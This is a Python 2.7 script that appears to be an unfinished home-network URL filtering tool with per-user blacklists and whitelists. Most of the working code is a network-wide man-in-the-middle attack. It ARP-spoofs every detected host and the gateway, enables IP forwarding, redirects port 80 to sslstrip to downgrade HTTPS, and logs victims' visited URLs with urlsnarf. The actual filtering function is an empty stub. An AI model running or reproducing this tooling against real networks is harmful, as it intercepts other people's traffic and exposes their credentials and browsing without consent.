#python 2.7

from multiprocessing import Pipe,Process
import logging
from threading import Thread,Lock
from time import sleep
from scapy.all import *
from datetime import datetime
import functions
from sys import exit,stdin
from user import *
from os import system
from subprocess import Popen,PIPE
from urlparse import urlparse
# except ImportError:
#
#     #TODO: handle all cases of missing modules and try to solve
#     print 'a module is missing please check you have all required modules'


# global variables:
localAddresses=[]
addressesLock=Lock()
user_list=[]
localHost=''
main_conn=Pipe()
defaultGateway=''


def blocked(user,url):
    """
    return True if site is blocked for user
    """
    if user.get_privilege() == 0: #admin can access all sites
        return False

    if user.get_privilege() == 1: #blacklist user
        for l_url in user.url_list:
            if l_url[1] == url:
                return True
        return False

    for l_url in user.get_url_list(): #whitelist user
        if l_url[1] == url:
            return False
    return True

def process_domain(domain,ip):
	pass
def handle_packet(pkt):
	"""
	checks for new host/addresses changes on network
	
	checks if arp operation is 'is-at' adn then update new address in the local addresses dict
	
	"""

	if ARP in pkt:
		if pkt[ARP].op == 2 and pkt[Ether].src!='b8:27:eb:fc:2f:ef': #check if ARP operation is: is-at
			address=pkt[ARP].psrc #extract IP address
			addressesLock.acquire()
			global localAddresses
			global localHost
			global defaultGateway
			print localHost+'_'
			print defaultGateway+'_'
			print address+'_'
			if address not in localAddresses.keys() and address != defaultGateway and address!=localHost: #check for duplicates and not default gateway or local host
				localAddresses[address]=pkt[Ether].src #add IP  and MAC address to dict of all hosts
				logging.info('added: {}'.format(address))
				print 'added: {}'.format(address)
			addressesLock.release()
		
        
def spoof(target,defaultGateway):
	"""
	arp spoofs specific ip address
	utilizes arpspoof package
	"""
	Popen('arpspoof -i eth0 -t {} {}'.format(target,defaultGateway),stdout=PIPE,stdin=PIPE,shell=True) #-i [interface] -t [target] [gateway]
	
def arp_spoof(defaultGateway):
	"""
	creates threads for spoofing each host on network
	"""
	threads={}
	while True:
		for target in localAddresses.keys():
			if target not in threads.keys():
				s=Thread(target=spoof,args=(target,defaultGateway,)) #thread for spoofing target
				s.start()
				s2=Thread(target=spoof,args=(defaultGateway,target)) #thread for spoofing router
				s2.start()
				threads[target]=[s,s2]
				logging.debug('spoofing:'+target)
				
	logging.info('spoofing all hosts')
		
def arp_sniff():
	""" 
	sniff for incoming arp packets
	"""
	sniff(prn=handle_packet)
    
    
def setup():
    """
    get all necessary values for the program to run
    and start all threads
    """
    #get default gateway, local IP address and local MAC address
    global defaultGateway
    global localHost
    defaultGateway,localHost=functions.getLocalhostAddress()
    logging.info('router:{}, local host:{}'.format(defaultGateway,localHost))
    print defaultGateway,localHost

	#get addresses of all hosts on network
    global localAddresses
    localAddresses=functions.get_Local_Addresses(defaultGateway,localHost) 
    if defaultGateway in localAddresses.keys():
    	del localAddresses[defaultGateway] #remove default gateway from address dict to prevent unneccery spoofing etc.
    	logging.debug('removed default gateway from local addresses list')
    logging.info('scanned network for all active hosts')
    print localAddresses
	
	#turn ip forwarding on
    system('sysctl -w net.ipv4.ip_forward=1')
    logging.info('ip forwarding enabled')
    
    Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=PIPE, stderr=PIPE, shell=True)
    Popen('sslstrip -p -k -f', stdout=PIPE, stderr=PIPE, shell=True)
	
	#create process for spoofing all hosts on network
    arpThread=Process(target=arp_spoof,args=(defaultGateway,))
    logging.info('created process for ARP spoofing')
    arpThread.start()
    
    """target='192.168.1.33'
    s=Thread(target=spoof,args=(target,defaultGateway,)) #thread for spoofing target
    s.start()
    s2=Thread(target=spoof,args=(defaultGateway,target)) #thread for spoofing router
    s2.start()"""
				
    arp_sniffer=Thread(target=arp_sniff)
    arp_sniffer.start()
    logging.info('arp sniffer started')
    print 'arp sniffer'
    
    return 1



def main(conn=None):
    """
    control the whole program
    gets the parameters for working
    then calls all functions in order
    """
    #setup logging to file logFile.log
    logging.basicConfig(filename='logFile.log',level=logging.DEBUG, format='%(lineno)s - %(levelname)s : %(message)s')
    logging.info('\n\n\n\n\n########## Program Start ##########\n\n')

	#get all required variables and start all threads
    setup() 
    logging.info('setup complete')
    
    
	
    global main_conn
    main_conn=conn
    
    print 'sniffing urls'
    urlsnarf=Popen('urlsnarf',stdout=PIPE,shell=True)
    logging.info('urlsnarf started')
    last_domain=''
    while True:
    	output=urlsnarf.stdout.readline()
    	fields=output.split(' ')
    	ip=fields[0]

    	for f in fields:
    		if 'http' in f and '?' not in f:
    			url=f
    			domain=url.split('/')[2]
    			if domain != last_domain:
    				last_domain=domain
    				logging.debug('ip:{},domain:{}'.format(ip,domain))
					#process_domain(domain,ip) 	
    """while True:
        command=main_conn.recv()

        if command==13:
            user=main_conn.recv()
            url_list=main_conn.recv()
            user_list.append(User(user[0],user[1],user[2],url_list))
            logging.info('New user connected'+user[0])
            print "user connected",user[0]"""



    #TODO: add queue to communicate to main program to update changing information for each user for example :ip address, privilege, url list



if __name__=='__main__':
    main()
